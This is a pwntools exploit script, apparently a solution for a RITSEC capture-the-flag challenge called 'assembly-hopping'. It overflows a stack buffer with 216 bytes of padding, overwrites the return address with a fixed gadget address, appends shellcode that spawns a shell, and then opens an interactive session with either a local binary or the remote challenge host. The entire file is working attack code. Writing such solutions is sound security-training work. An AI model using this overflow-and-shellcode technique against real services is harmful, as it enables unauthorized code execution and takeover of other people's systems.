from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
#context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./assembly"
libc_path = "./libc-2.27.so"
ld_path = "/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-2.27.so"

#elf, rop = ELF(vuln_path), ROP(vuln_path)

if not f_remote:
    io = process(vuln_path)
else:
    io = remote("assembly-hopping.challenges.ctf.ritsec.club", 1337)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    #pause()


payload = b"a" * 216 + p64(0x401156) + asm(shellcraft.sh())
io.sendline(payload)

io.interactive()
